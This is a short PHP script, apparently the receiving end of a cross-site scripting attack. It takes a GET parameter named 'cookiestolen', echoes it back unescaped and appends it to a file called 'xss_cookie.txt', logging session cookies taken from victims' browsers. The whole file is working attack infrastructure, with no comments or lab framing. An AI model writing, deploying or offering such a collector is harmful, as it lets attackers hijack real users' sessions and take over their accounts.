<?php
	
	if(empty($_GET)){
        echo "_GET empty!<br>";
    }
    else {

	$cookiestolen= $_GET["cookiestolen"];
        echo "$cookiestolen";
        $fp = fopen('xss_cookie.txt', 'a') or  die ("Unable to open file!");;
        fwrite($fp, $cookiestolen."\n");
        fclose($fp);

    }

?>  
